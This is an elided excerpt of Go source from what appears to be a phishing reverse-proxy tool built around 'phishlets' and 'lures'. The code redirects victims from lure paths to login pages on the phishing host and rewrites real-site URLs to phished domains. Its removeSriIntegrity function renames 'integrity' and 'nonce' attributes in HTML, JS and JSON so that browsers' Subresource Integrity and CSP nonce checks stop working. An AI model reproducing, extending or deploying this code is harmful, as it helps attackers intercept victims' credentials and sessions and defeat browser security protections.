	...
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			if phished {
						...
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								...
								if err == nil {
									...
									log.Debug("[%d] [%s] landing redirect check: landing_url=%q redirector=%q hostname=%q req.Host=%s", sid, hiblue.Sprint(pl_name), l.LandingUrl, l.Redirector, l.Hostname, req.Host)
									if l.Redirector == "" {
										...
										if l.LandingUrl != "" {
											...
											log.Debug("[%d] [%s] landing redirect: buildPhishletLoginUrl -> %q", sid, hiblue.Sprint(pl_name), redir_url)
										}
										if redir_url != "" {
											log.Info("[%d] [%s] lure landing redirect: %s -> %s", sid, hiblue.Sprint(pl_name), req.Host, redir_url)
				...
				// redirect to landing/login page if triggered lure path
				if pl != nil {
					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
					if err == nil {
						// prefer lure landing_url over phishlet login url
						var rurl string
						...
						if rurl == "" {
							// fallback to phishlet login url
							rurl = pl.GetLoginUrl()
							...
							log.Debug("[%d] [%s] triggered lure path redirect: login url -> %q", ps.Index, hiblue.Sprint(pl_name), rurl)
						} else {
							// buildLureLandingUrl already returns a phished-host URL
							u, err := url.Parse(rurl)
							if err == nil {
								target_host = u.Host
							}
						...
						if rurl != "" {
							...
							if err == nil {
								...
								if !need_redirect && target_host != "" && !strings.EqualFold(req.Host, target_host) {
									need_redirect = true
								}

								if need_redirect {
									log.Info("[%d] [%s] lure path redirect: %s -> %s", ps.Index, hiblue.Sprint(pl_name), req_url, rurl)
									resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
									if resp != nil {
	...
	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			if err == nil {
				...
				// We process all three types because:
				// 1. HTML may contain <script integrity="..."> tags
				// 2. JS may reference integrity in code (getAttribute, property access, etc.)
				// 3. JSON may contain importmap with "integrity" keys
				// Our regex uses \b word boundaries to match only standalone "integrity" words,
				// avoiding compound words like importMapIntegrityCount or scriptsWithIntegrity.
...
func (p *HttpProxy) buildPhishletLoginUrl(pl *Phishlet) string {
	landing_host := pl.GetLandingPhishHost()
	if landing_host == "" {
		return ""
	}
	login_url := pl.GetLoginUrl()
	lu, err := url.Parse(login_url)
	if err != nil {
		return ""
	}
...
func (p *HttpProxy) buildLureLandingUrl(landingUrl string, reqPath string, pl *Phishlet) string {
	...
	if err != nil {
		log.Debug("buildLureLandingUrl: failed to parse %q: %v", landingUrl, err)
		return ""
	}
	log.Debug("buildLureLandingUrl: landingUrl=%q host=%q path=%q landing_host=%s", landingUrl, lu.Host, lu.Path, landing_host)

	if lu.Host == "" {
		// path only - use phishlet landing host
		path := lu.Path
		if path == "" {
			path = "/"
		}
		ret := "https://" + landing_host + path
		log.Debug("buildLureLandingUrl: path-only -> %s", ret)
		return ret
	}

	// full URL - rewrite original host to phished host if it belongs to a proxy host
	if redir_url, ok := p.replaceUrlWithPhished(landingUrl); ok {
		log.Debug("buildLureLandingUrl: full URL mapped -> %s", redir_url)
		return redir_url
	}

	// host does not map to any phishlet proxy host - fall back to path on landing host
	path := lu.Path
	if path == "" {
		path = "/"
	}
	ret := "https://" + landing_host + path
	log.Debug("buildLureLandingUrl: host not mapped, fallback -> %s", ret)
	return ret
}
...
func (p *HttpProxy) removeSriIntegrity(body []byte) []byte {
	// Global rename: integrity → xintegrity, nonce → xnonce
	// Browsers don't recognize these renamed attributes, so SRI/CSP checks are disabled.
	// All references in HTML, JS, and JSON are renamed consistently, so code logic is preserved.
	//
	// Examples:
	//   HTML:  <script integrity="sha256-...">  →  <script xintegrity="sha256-...">
	//   JS:    getAttribute("integrity")        →  getAttribute("xintegrity")
	//   JS:    r.integrity != null               →  r.xintegrity != null
	//   JS:    integrity: getValue()             →  xintegrity: getValue()
	//   JSON:  "integrity": {"/path.js": "..."}  →  "xintegrity": {"/path.js": "..."}
	//
	// NOT matched (compound words, preserved as-is):
	//   importMapIntegrityCount, scriptsWithIntegrity, etc.
	body = sriIntegrityRe.ReplaceAll(body, []byte("xintegrity"))
